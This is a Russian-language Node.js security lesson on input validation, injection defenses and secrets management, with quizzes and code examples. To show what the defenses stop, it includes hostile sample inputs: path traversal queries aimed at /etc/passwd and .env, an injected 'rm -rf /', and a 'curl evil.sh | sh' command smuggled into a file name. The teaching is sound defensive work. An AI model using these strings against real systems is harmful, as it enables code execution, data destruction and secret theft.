---
concepts:
- schema-validation
- parse-dont-validate
- injection-defense
- parameterized-queries
- command-injection
- secrets-management
deepensInto: []
estMin: 19
lang: ru
lessonType: topic
level: senior
order: 1
prereqs: []
slug: 01-input-and-secrets
sources:
- https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html
- https://owasp.org/www-project-top-ten/
- https://nodejs.org/api/cli.html#--env-fileconfig
spiral: []
status: ready
summary: 'Любой внешний ввод враждебен, пока схема на границе не превратит его в типизированное
  значение. У каждого класса инъекций своя защита: параметризованные запросы, arg-массив
  вместо shell, проверка базовой папки для путей, ограничение длины против ReDoS. Секреты
  — в env, не в git.'
title: 'Валидация ввода и работа с секретами'
track: node
unit: 07-security
---



import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import DragOrder from "~/components/pedagogy/DragOrder.astro";
import TradeoffMatrix from "~/components/pedagogy/TradeoffMatrix.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
Внутренний админский эндпоинт брал query-параметр `?file=` и делал `res.send(await readFile("./reports/" + req.query.file))`. Его выкатили в пятницу. К понедельнику кто-то запросил `?file=../../../../etc/passwd` и вышел прямо за пределы папки отчётов, потом `?file=../../.env` и вытащил пароль к продовой базе — который закоммитили в репозиторий год назад, и он всё ещё был валиден. Сложились два отдельных греха: ввод пользователя, склеенный в путь файла, и секрет, навсегда живущий в истории git. Ни то ни другое не было экзотическим эксплойтом. И то и другое — отсутствие единственной границы, которая должна была отклонить, разрешить путь и отказать.
</Hook>

<Crux>Валидируй любой ввод схемой на границе, параметризуй запросы, не строй shell-команду из ввода, держи секреты в env.</Crux>

<Explanation>

## Валидируй на границе, parse don't validate

Считай каждый байт, пересекающий край процесса — тело запроса, query-строку, route-параметры, заголовки, даже переменные окружения — враждебным, пока не доказано обратное. Сеньорская дисциплина — **parse, don't validate** (разбирай, не валидируй): на входе прогоняй сырой ввод через *схему* (zod, ajv, Joi), которая утверждает тип, диапазон, длину и allowlist форм, и отдавай остальному коду *типизированное значение*, которому он может доверять. Если ввод не совпадает, **отклони его** с 400 — не «санитизируй» молча, вырезая символы, потому что санитизация тихо мутирует ввод атакующего в нечто, что может остаться опасным и теперь ещё и неверно.

```ts
import { z } from "zod";

const CreateUser = z.object({
  email: z.string().email().max(254),
  age: z.number().int().min(13).max(120),
  role: z.enum(["member", "admin"]), // allowlist, а не свободная строка
});

app.post("/users", (req, res) => {
  const parsed = CreateUser.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid" });
  createUser(parsed.data); // parsed.data полностью типизирован, ему можно доверять
});
```

Сюда же относится ещё один контроль на границе: **ограничь размер тела**. Безграничное JSON-тело позволяет атакующему прислать сотни мегабайт и исчерпать память — тривиальный отказ в обслуживании. Поставь лимит (`express.json({ limit: "100kb" })`), чтобы парсер отклонял раздутые payload до того, как они дойдут до кучи.

## Семейство инъекций: одна защита на каждый вид

Большая часть категории «Injection» из OWASP Top 10 сводится к одному правилу: **никогда не давай недоверенным данным стать кодом.** У каждого канала своя единственная верная защита, и они не взаимозаменяемы.

<div data-lesson-visual class="overflow-x-auto my-6">
  <table class="w-full text-sm border-collapse">
    <thead>
      <tr class="bg-surface-2">
        <th class="border border-border px-3 py-2 text-left">Угроза</th>
        <th class="border border-border px-3 py-2 text-left">Вектор</th>
        <th class="border border-border px-3 py-2 text-left">Единственная защита</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td class="border border-border px-3 py-2">SQL-инъекция</td>
        <td class="border border-border px-3 py-2">ввод склеен в строку запроса</td>
        <td class="border border-border px-3 py-2">параметризованные запросы / prepared statements</td>
      </tr>
      <tr class="bg-surface-2">
        <td class="border border-border px-3 py-2">Command injection</td>
        <td class="border border-border px-3 py-2"><code>exec</code> с интерполяцией в shell-строку</td>
        <td class="border border-border px-3 py-2"><code>execFile</code>/<code>spawn</code> + arg-массив, без shell</td>
      </tr>
      <tr>
        <td class="border border-border px-3 py-2">Path traversal</td>
        <td class="border border-border px-3 py-2"><code>req.params.file</code> склеен в путь</td>
        <td class="border border-border px-3 py-2"><code>path.resolve</code> + проверка под базовой папкой</td>
      </tr>
      <tr class="bg-surface-2">
        <td class="border border-border px-3 py-2">ReDoS</td>
        <td class="border border-border px-3 py-2">катастрофический regex на вводе атакующего</td>
        <td class="border border-border px-3 py-2">линейные паттерны + ограничение длины</td>
      </tr>
    </tbody>
  </table>
</div>

Для **SQL** фикс — параметризованные запросы: драйвер шлёт текст запроса и значения по раздельным каналам, так что база никогда не парсит твои данные как синтаксис. Для **shell-команд** избегай shell полностью — `child_process.execFile`/`spawn` с *массивом аргументов* передаёт каждый аргумент как литерал, так что значение вроде `; rm -rf /` — просто странное имя файла, а не вторая команда. Для **путей** разрешай до абсолютного пути и подтверждай, что он всё ещё внутри базовой папки. Для **ReDoS** regex с вложенными квантификаторами вроде `/^(a+)+$/` может катастрофически бэктрекать на длинной подобранной строке и заблокировать единственный поток на секунды-минуты.

```js
import { execFile } from "node:child_process";
import path from "node:path";

// ✅ SQL: значения идут отдельно от текста запроса
await db.query("SELECT * FROM users WHERE email = $1", [email]);

// ✅ команда: arg-массив, без shell — ввод не станет новой командой
execFile("convert", [userPath, "-resize", "100x100", outPath]);

// ✅ путь: разреши, потом докажи, что он внутри базовой папки
const base = path.resolve("./reports");
const full = path.resolve(base, req.params.file);
if (!full.startsWith(base + path.sep)) return res.sendStatus(400);
```

<Inset kind="why" lang="ru">
Почему `spawn(..., { shell: true })` опасен, а форма с массивом безопасна? С `shell: true` (и всегда с `exec`) Node отдаёт твою строку в `/bin/sh -c`, который её перепарсивает — так что `;`, `|`, `$()` и обратные кавычки снова становятся метасимволами shell, и `file.txt; curl evil.sh | sh` запускает две команды. Массив аргументов обходит shell: ядро делает `execve` бинарника напрямую, и каждый элемент массива становится одним нетронутым `argv`-элементом. Никакого перепарсивания, никаких метасимволов, никакой поверхности для инъекции.
</Inset>

## Секреты: env внутрь, никогда в git

Секрет — это всё, что даёт доступ: пароли БД, API-ключи, ключи подписи, токены. Непреложные правила: **никогда не хардкодь и никогда не коммить их.** Читай конфигурацию из `process.env`; для локальной разработки грузи файл `.env` встроенным `node --env-file=.env` (доступно с **Node 20.6**) или пакетом `dotenv` — и добавь `.env` в `.gitignore`, чтобы он никогда не попал в репозиторий.

```bash
# локальная разработка: грузим env без зависимостей (Node 20.6+)
node --env-file=.env server.js
```

```js
// читай на старте; падай сразу, если обязательный секрет отсутствует
const dbUrl = process.env.DATABASE_URL;
if (!dbUrl) throw new Error("DATABASE_URL is not set");
```

В проде вообще не вози `.env` — используй **менеджер секретов** (HashiCorp Vault, AWS Secrets Manager, Doppler), который вставляет значения в рантайме, так что секреты никогда не лежат в твоём образе или репозитории. Три привычки отделяют закалённый сервис: **не логируй секреты** (редакти токены до того, как они попадут в строку лога), **ротируй при утечке** (закоммиченный `.env` — это *постоянная* утечка: он живёт в истории git даже после удаления файла, так что надо ротировать сам секрет, а не просто `git rm`) и применяй **наименьшие привилегии**, чтобы утёкший токен мог сделать как можно меньше.

<TradeoffMatrix
  id="07-input-and-secrets-tradeoff-1"
  lessonSlug="01-input-and-secrets"
  lang="ru"
  prompt="Сервис должен запустить внешний инструмент обработки картинок на имени файла, пришедшем из загрузки пользователя. Какой способ вызова безопасен?"
  options={[
    { name: "execFile('convert', [userFile, '-resize', '100x100', out]) — массив аргументов, без shell", summary: "Аргументы — литералы.", correct: true, justification: "Это верный дефолт. execFile (и spawn) с массивом делает execve бинарника напрямую: каждый элемент становится одним нетронутым argv-элементом, так что ядро никогда не перепарсивает значение. Имя файла вроде 'a.png; rm -rf /' передаётся как один литеральный аргумент — странное имя, а не вторая команда. Shell нет, значит нет метасимволов и нет поверхности для инъекции, что бы пользователь ни ввёл." },
    { name: "exec(`convert ${userFile} -resize 100x100 ${out}`) — строка с интерполяцией", summary: "Shell её перепарсивает.", justification: "exec прогоняет строку через /bin/sh -c, который перепарсивает метасимволы. Интерполированное значение пользователя может нести ; | $() или обратные кавычки, превращая одну команду во много — 'a.png; curl evil.sh | sh' выполняет код атакующего. Это канонический баг command injection; интерполировать недоверенные данные в shell-строку никогда не безопасно." },
    { name: "spawn('convert', [userFile, ...], { shell: true })", summary: "shell:true тоже перепарсивает.", justification: "shell:true сводит на нет всю пользу формы с массивом: Node маршрутизирует весь вызов обратно через /bin/sh, который перепарсивает метасимволы в аргументах. Ты снова в command injection. Форма с массивом безопасна только БЕЗ shell:true — как только shell на пути, недоверенный ввод может вырваться." },
    { name: "exec на строке, но сначала экранировать ; и | в userFile", summary: "Экранирование по блоклисту.", justification: "Самописное экранирование shell — это блоклист, а блоклисты метасимволов shell печально неполны: переводы строк, $(), обратные кавычки, globbing, локали и крайние случаи кавычек проскальзывают. Верный ход — убрать shell из уравнения массивом аргументов, а не пытаться переэкранировать парсер shell." },
  ]}
/>

<Quiz
  id="07-input-and-secrets-quiz-1"
  lessonSlug="01-input-and-secrets"
  lang="ru"
  question="Почему параметризованный запрос (db.query('... WHERE email = $1', [input])) останавливает SQL-инъекцию, а конкатенация строк нет?"
  choices={[
    { label: "Драйвер шлёт текст запроса и значения параметров по раздельным каналам, так что база парсит твой SQL один раз, а затем привязывает значения как данные — ввод атакующего никогда не интерпретируется как синтаксис SQL", correct: true },
    { label: "Драйвер сканирует значения на SQL-ключевые слова вроде DROP и удаляет их", misconception: "Параметризация — это не фильтрация ключевых слов; она никогда не ищет в данных «плохих слов». Значение 'DROP TABLE' хранится дословно и безвредно; безопасность идёт от привязки значений как данных, отдельно от уже разобранного запроса, а не от блоклиста." },
    { label: "Она оборачивает каждое значение в кавычки за тебя, чтобы строка была валидным SQL", misconception: "Автокавычки — это ровно то хрупкое экранирование, которое эксплуатирует инъекция. Параметризованные запросы вообще не строят SQL-строку — значение никогда не становится частью текста запроса, так что нет кавычек, из которых можно выйти." },
    { label: "Она выполняет запрос в read-only транзакции", misconception: "Параметризация не имеет отношения к транзакциям или read-only режиму. Параметризованный INSERT или DELETE всё равно пишет; защита в том, что ввод привязан как данные, а не разобран как синтаксис." },
  ]}
/>

<Quiz
  id="07-input-and-secrets-quiz-2"
  lessonSlug="01-input-and-secrets"
  lang="ru"
  question="Тебе нужно запустить CLI-инструмент на аргументе от пользователя. Почему execFile('tool', [userArg]) безопаснее, чем exec(`tool ${userArg}`)?"
  choices={[
    { label: "execFile запускает бинарник напрямую, каждый элемент массива — один литеральный argv-элемент; shell не участвует, так что метасимволы вроде ; | $() в userArg передаются как данные, а не перепарсиваются в новые команды", correct: true },
    { label: "execFile автоматически экранирует метасимволы shell в аргументах", misconception: "Экранировать нечего, потому что shell нет. execFile (без shell:true) делает execve бинарника напрямую; массив аргументов обходит /bin/sh целиком, а не экранирует для него." },
    { label: "execFile быстрее, и именно скорость предотвращает инъекцию", misconception: "Производительность не имеет отношения к инъекции. Безопасность идёт от удаления shell с пути вызова, чтобы недоверенный ввод не стал второй командой, — а не от того, как быстро стартует дочерний процесс." },
    { label: "exec устарел, и execFile его заменил", misconception: "exec не устарел; оба существуют для разных задач. Дело семантическое: exec порождает shell, который перепарсивает строку, а execFile с массивом — нет; вот почему один инъекционен, а другой нет." },
  ]}
/>

<DragOrder
  id="07-input-and-secrets-drag-1"
  lessonSlug="01-input-and-secrets"
  lang="ru"
  prompt="Расставь, как запрос входит в закалённый эндпоинт, от края внутрь:"
  items={[
    { id: "a", label: "Ограничь размер тела, чтобы раздутый payload отклонился до парсинга" },
    { id: "b", label: "Провалидируй разобранное тело схемой, отклонив невалидный ввод с 400" },
    { id: "c", label: "Используй уже типизированное значение в параметризованном запросе — никакой склеенной SQL-строки" },
    { id: "d", label: "Запускай любую внешнюю команду через execFile + массив аргументов, без shell" },
    { id: "e", label: "Действуй токеном наименьших привилегий из env, никогда не хардкоженным секретом" },
  ]}
  correctOrder={["a", "b", "c", "d", "e"]}
/>

</Explanation>

<FlowDiagram
  label="Недоверенный ввод пересекает границу в типизированное значение и безопасное выполнение"
  hue="var(--d-systems)"
  perRow={4}
  nodes={[
    { id: "i", label: "недоверенный ввод", sub: "body / query / env" },
    { id: "v", label: "валидация схемой", sub: "граница" },
    { id: "t", label: "типизир. значение", sub: "доверенное" },
    { id: "s", label: "безопасный запуск", sub: "param / arg array" },
  ]}
  edges={[
    { from: "i", to: "v", label: "отклони плохое" },
    { from: "v", to: "t", label: "parse" },
    { from: "t", to: "s" },
  ]}
  caption="Любой внешний ввод враждебен, пока схема на границе не разберёт его в типизированное значение и не отклонит невалидное. Только это доверенное значение течёт в безопасное выполнение — параметризованные запросы, массив аргументов вместо shell, проверка базовой папки для путей — а секреты приходят из env, никогда из исходников."
/>

<KeyTakeaway>Считай весь внешний ввод враждебным: разбери его в типизированное значение схемой на краю и отклони невалидное. Параметризуй запросы, передавай arg-массив (не shell), проверяй базовую папку. Секреты — в env, не в git.</KeyTakeaway>

<RetrievalDrawer
  client:load
  id="07-input-and-secrets-retrieval"
  lang="ru"
  questions={[
    { q: "Почему удалить закоммиченный файл .env недостаточно и что надо делать вместо этого?", a: "Потому что git — это история, а не снимок. Как только .env (или любой секрет) закоммичен, он навсегда живёт в истории репозитория — каждый клон, каждый форк и каждый бэкап всё ещё содержат старый объект, и любой с доступом на чтение может выкатить коммит, где он существовал, и прочитать значение. `git rm .env` с последующим коммитом убирает его только из текущего tip; секрет по-прежнему восстановим из истории. Так что закоммиченный секрет — это постоянная утечка, и единственный верный ответ — РОТИРОВАТЬ секрет: выпустить новый пароль/ключ/токен и инвалидировать старый у источника (база, облачный провайдер, API). Переписывание истории (filter-repo / BFG) может вычистить объект, но надо предполагать, что его уже прочитали, и ротировать в любом случае. Дальше держи .env в .gitignore, чтобы он не попадал в репозиторий, а в проде используй менеджер секретов, который вставляет значения в рантайме, а не хранит их в дереве вовсе." },
    { q: "В чём разница между валидацией ввода и его санитизацией и почему этот урок предпочитает отклонять невалидное?", a: "Валидация задаёт вопрос да/нет — совпадает ли ввод с ожидаемой схемой (тип, диапазон, длина, allowlist форм)? — и отклоняет всё, что не прошло, обычно с 400. Санитизация же мутирует ввод, вырезая или экранируя символы, пытаясь сделать плохое значение безопасным. Урок предпочитает отклонять невалидное (parse, don't validate) по двум причинам. Первая: санитизация — это замаскированный блоклист, ты можешь вырезать только те опасные паттерны, о которых подумал, а атакующие специализируются на тех, о которых ты не подумал (двойное кодирование, юникод-двойники, вложенные payload). Вторая: тихое переписывание ввода означает, что остальной код работает на данных, которые вызывающий никогда не присылал, — на значении, которое теперь и возможно-всё-ещё-опасно, И семантически неверно, что прячет баги. Схема на границе превращает сырые байты в типизированное доверенное значение ровно один раз; код ниже может предполагать валидность вместо повторных проверок, а защиты конкретных каналов (параметризованные запросы, массивы аргументов) обрабатывают любой легитимно прошедший опасно выглядящий контент." },
  ]}
/>

<Recap lang="ru">
Вся безопасность ввода — это одна граница: считай каждый внешний байт — тело, query, params, заголовки, env — враждебным и на краю прогоняй через схему (zod / ajv / Joi), которая утверждает тип, диапазон, длину и allowlist, отклоняя невалидное с 400, а не санитизируя молча. Это превращает сырой ввод в типизированное доверенное значение один раз (parse, don't validate), и ты ограничиваешь размер тела, чтобы раздутый payload не исчерпал память. Дальше у каждого класса инъекций своя единственная защита: SQL → параметризованные запросы, где значения идут отдельно от текста запроса, так что данные не парсятся как синтаксис; команда → `execFile`/`spawn` с массивом аргументов и без shell, чтобы ввод не стал второй командой (а `shell: true` снова открывает дыру); path traversal → `path.resolve` плюс проверка, что результат остаётся внутри разрешённой базовой папки; ReDoS → линейные паттерны и ограничение длины ввода, ведь regex с вложенными квантификаторами может заблокировать единственный поток на секунды. Секреты следуют своей дисциплине: читай из `process.env`, грузи локальный конфиг через `node --env-file=.env` (Node 20.6+) или dotenv, держа `.env` в `.gitignore`, используй менеджер секретов в проде, никогда не логируй секреты, применяй наименьшие привилегии и помни, что закоммиченный секрет — это постоянная утечка в истории git, которую надо ротировать, а не просто удалить. Теперь, когда встретишь `?file=` параметр, склеиваемый в путь, или секрет в конфиге — ты знаешь, какой именно границы не хватает и в чём единственный фикс.
</Recap>
